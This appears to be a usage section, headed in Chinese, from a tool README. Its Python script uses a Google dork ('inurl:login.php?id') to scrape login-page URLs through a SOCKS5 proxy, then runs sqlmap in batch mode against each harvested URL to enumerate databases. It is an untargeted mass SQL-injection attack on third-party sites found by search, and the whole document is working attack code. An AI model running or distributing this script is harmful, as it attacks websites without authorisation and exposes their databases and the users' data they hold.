### 用法
```
def sqlmqp_google():
    with open('google.txt', 'r') as f:
        urls = f.read().split('\n')

    for i in urls:
        os.system(
            'sqlmap -u {} –batch --thread 10 --dbs --beep --level 3'.format(i))


if __name__ == "__main__":
    if not os.path.exists('google.txt'):
        google_spider = GoogleSpider(
            keyword='inurl:login.php?id',
            proxy_server='socks5://127.0.0.1:9090',
        )
        google_spider.start()
    sqlmqp_google()
```
